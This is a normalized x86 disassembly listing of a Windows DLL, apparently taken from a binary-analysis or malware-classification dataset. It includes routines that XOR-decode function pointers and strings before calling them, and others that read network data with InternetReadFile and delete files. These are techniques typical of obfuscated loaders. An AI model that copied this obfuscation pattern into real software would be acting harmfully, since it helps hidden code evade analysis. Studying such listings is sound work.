mov [ esi + 0x10 ] ecx
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10009660
push ebp
mov ebp esp
push 0xffffffff
push sub_10087938
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_1004131f
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1003a960
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_100096d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d91
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
xor ebx ebx
mov edi edi
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp esi ebx
je r-xdata
add esi 0x1c
add edi 0x1c
jmp r-xdata
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
cmp esi edi
je r-xdata
cmp edi [ ebp + 0xc ]
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
cmp [ edi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ edi ]
mov [ esi ] eax
mov [ edi ] ebx
mov eax [ edi + 0x10 ]
lea edx [ eax + eax + 0x2 ]
push edx
push edi
push esi
call sub_1007ec40
add esp 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x14 ] edx
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
sub_100097a0
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1000985a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x4
lea ecx [ eax + 0x1c ]
sub_10009880
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_100087a3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10009917
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10009996
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10009a20
cmp esi edi
je r-xdata
mov eax esi
retn
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10009a70
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx 0x3
mov [ ebp - 0xb4 ] eax
xor eax eax
push ebx
mov [ ebp - 0xb8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x14 ] dx
push esi
mov [ ebp - 0xac ] eax
mov [ ebp - 0xb0 ] eax
lea edx [ eax + 0x1 ]
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x5b
and esi 0xff
mov [ ebp + eax * 2 - 0x38 ] si
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
xor eax eax
mov [ ebp - 0x24 ] ax
mov esi [ ecx ]
lea eax [ ebp - 0xac ]
push eax
push r--data
lea eax [ ebp - 0x38 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xac ]
jns r-xdata
lea edx [ ebp - 0xa4 ]
mov [ ebp - 0xa4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x6
call sub_1002f620
mov ebx [ ebp - 0xb8 ]
mov esi [ ebx + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xc8
jmp r-xdata
lea edx [ ebp - 0x8c ]
mov eax 0x3c
call sub_1002f620
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
mov eax 0xb3
call sub_1002f620
mov esi [ ebx + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xa4 ]
push ecx
push edi
call sub_10007950
test eax eax
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x7f
jmp r-xdata
call sub_1002f620
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0xa8 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xa8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xa8 ] 0x0
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x35
jmp r-xdata
mov eax [ ebp - 0xac ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xa4 ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x53
call sub_1002f620
mov esi [ ebp - 0xa8 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xa4 ]
push edx
push edi
call sub_10007950
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xa8 ]
push eax
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0xb4 ]
mov eax [ ecx ]
mov edx [ eax ]
mov edx [ edx + 0x54 ]
lea ecx [ ebp - 0xb0 ]
push ecx
mov ecx [ ebp - 0xac ]
push ecx
push eax
call edx
mov eax [ ebp - 0xb0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0xd2
jmp r-xdata
lea edx [ ebp - 0xa0 ]
mov eax 0x7
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa4 ]
test eax eax
je r-xdata
sub_10009cf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b93
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x3c4 ]
mov eax [ esi + 0x3c0 ]
mov [ ebp - 0x48 ] esi
mov ebx edx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x19
call sub_10069020
mov edi [ esi + 0x3a0 ]
mov eax [ esi + 0x3a4 ]
cmp edi eax
je r-xdata
cmp [ eax ] ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
cmp ebx [ ecx ]
je r-xdata
cmp eax ecx
je r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov edx [ esi + 0x34 ]
lea ecx [ esi + 0x20 ]
cmp edx 0x10
jb r-xdata
add edi 0x4
cmp edi eax
jne r-xdata
mov edx ecx
add eax 0x8
cmp eax edx
je r-xdata
mov esi ecx
mov esi [ ecx ]
jmp r-xdata
jmp r-xdata
add [ esi + 0x3c4 ] 0xfffffff8
jmp r-xdata
lea ecx [ eax - 0x8 ]
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x44 ] dx
mov edx [ ebp - 0x48 ]
push edx
push eax
push ecx
lea eax [ ebp - 0x44 ]
xor esi esi
push eax
mov [ ebp - 0x30 ] 0x7
mov [ ebp - 0x34 ] esi
call sub_1006f5a0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
lea eax [ ebp - 0x28 ]
lea edx [ esi + 0x4 ]
lea ebx [ eax + 0x2 ]
nop
mov ecx [ ecx ]
mov eax [ ecx + 0x10 ]
add eax esi
cmp edx 0x10
jb r-xdata
mov edi [ eax ]
mov [ ecx ] edi
mov edi [ eax + 0x4 ]
mov [ ecx + 0x4 ] edi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
lea ecx [ ebp - 0x28 ]
push ecx
push edx
call sub_10020700
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x3e8
mov [ ebp - 0x4c ] esi
test esi esi
je r-xdata
mov edx [ ebp - 0x44 ]
push edx
call sub_1000a86e
add esp 0x4
mov esi [ ebp - 0x48 ]
mov ecx [ esi + 0x3a4 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_1007ec40
add esp 0xc
add [ esi + 0x3a4 ] 0xfffffffc
jmp r-xdata
lea ecx [ esi + 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001990
cmp [ esi + 0x18 ] 0x8
jb r-xdata
cmp [ ebp - 0x30 ] 0x8
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0x7
mov [ esi + 0x14 ] 0x0
push esi
mov [ esi + 0x4 ] ax
call sub_1000a86e
add esp 0x4
mov edx [ esi + 0x4 ]
push edx
call sub_1000a86e
add esp 0x4
sub_10009eb0
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x20 ]
mov [ esi ] ecx
mov ecx [ ebp + 0x10 ]
mov [ edi ] edx
xor edx edx
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
cmp eax ecx
setne dl
mov [ ebp - 0x10 ] edx
cmp eax ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
mov eax [ ebp + 0x1c ]
cmp [ edi ] eax
je r-xdata
mov ebx [ edi ]
call sub_10030f53
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x18 ]
sub ecx ebx
add edx 0x8
cmp eax ecx
mov eax [ ebp - 0x14 ]
push edx
push eax
jg r-xdata
mov ecx [ eax ]
mov eax [ esi ]
mov [ ebp - 0x1c ] ecx
movzx ecx [ eax ]
push ecx
lea edx [ ebp - 0xc ]
push edx
call sub_10063545
mov ebx eax
add esp 0x10
test ebx ebx
js r-xdata
mov ecx [ esi ]
movzx edx [ ecx ]
push edx
push ebx
call sub_10063545
add esp 0x10
test eax eax
js r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
mov eax [ edi ]
mov ecx [ ebp + 0x1c ]
sub ecx eax
cmp ecx ebx
jl r-xdata
add [ esi ] 0x2
add [ edi ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
mov [ edx ] ecx
push ebx
lea edx [ ebp - 0xc ]
push edx
push eax
call sub_1007f580
add [ esi ] 0x2
add esp 0xc
add [ edi ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x0
cmp [ esi ] eax
jne r-xdata
jmp r-xdata
sub_10009fd9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_100567c9
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10038bf1
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000a2a1
pop ecx
sub_1000a030
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x0
push 0x0
lea edx [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ecx ]
push edx
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
push 0x401
push 0x0
mov [ ebp + 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
lea edx [ ebp + 0x8 ]
push edx
mov esi eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x400
push esi
push ecx
call [ InternetReadFile@IAT ]
mov edx [ ebp + 0x8 ]
mov [ esi + edx ] 0x0
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
inc eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebx ]
lea ecx [ eax + edi + 0x1 ]
push ecx
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
inc ecx
push ecx
mov edx eax
add edx edi
push 0x0
push edx
mov [ ebx ] eax
call sub_1007f8f0
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
push eax
add ecx edi
push esi
push ecx
call sub_1007f580
add esp 0x18
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push edx
call [ InternetQueryDataAvailable@IAT ]
test eax eax
jne r-xdata
sub_1000a15c
push 0x28
mov eax sub_10085e3c
call sub_10026266
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_10030066
mov [ esi ] r--data
jmp r-xdata
sub_1000a200
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
call edx
cmp [ esi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop esi
retn
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push eax
call [ DeleteFileW@IAT ]
pop esi
retn
mov eax [ eax ]
sub_1000a259
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1005664f
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000a280
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10009880
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1000a2a1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_1001b2d2
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_1001b2d2
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_1001b2d2
push [ esi + 0xc0 ]
call sub_1001b2d2
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10046c41
push [ esi + 0xd4 ]
call sub_1001b2d2
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_1001b2d2
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
push [ esi + 0xb0 ]
call sub_1001b2d2
push [ esi + 0xbc ]
call sub_1001b2d2
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_1001b2d2
push [ esi + 0xbc ]
call sub_1003f1b2
pop ecx
pop ecx
push eax
call sub_1001b2d2
pop ecx
push eax
call sub_1001b2d2
push [ esi + 0xbc ]
call sub_1001307c
pop ecx
pop ecx
sub_1000a410
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi edx
lea esi [ edi + 0x1c ]
push esi
push r--data
push 0x1
push 0x0
push r--data
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] ecx
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
mov edx 0x3
mov [ ebp - 0x38 ] dx
lea edx [ ebp - 0x10 ]
mov eax 0x8d
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x30 ] 0x1
call sub_1002f620
mov ebx [ ebp - 0x38 ]
mov ecx [ esi ]
mov edx [ ecx ]
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ebx
mov ebx [ ebp - 0x30 ]
mov [ eax + 0x8 ] ebx
mov ebx [ ebp - 0x2c ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] ebx
call ecx
test eax eax
jns r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x14 ]
push edx
mov edx [ ebp - 0x20 ]
mov ecx edi
xor ebx ebx
call sub_10018600
test eax eax
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi ]
lea edx [ ebp - 0x18 ]
push edx
mov edx [ ebp - 0x14 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
test eax eax
jns r-xdata
mov ebx 0x3
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
je r-xdata
lea ebx [ edi + 0x6 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
test eax eax
je r-xdata
mov esi [ esi ]
mov eax [ esi ]
mov edx [ eax + 0x88 ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
call edx
test eax eax
jns r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x18 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
push eax
call sub_10019010
mov ecx [ ebp - 0x1c ]
push ecx
call [ SysFreeString@IAT ]
mov ebx 0x4
jmp r-xdata
sub_1000a5a0
test ebx ebx
je r-xdata
retn
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_1007f580
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_1000a5dd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1000a631
push 0x8
mov eax sub_100853f8
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1003d7d5
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10003340
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10016570
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10016570
mov [ esi + 0x10 ] eax
add esp 0xc
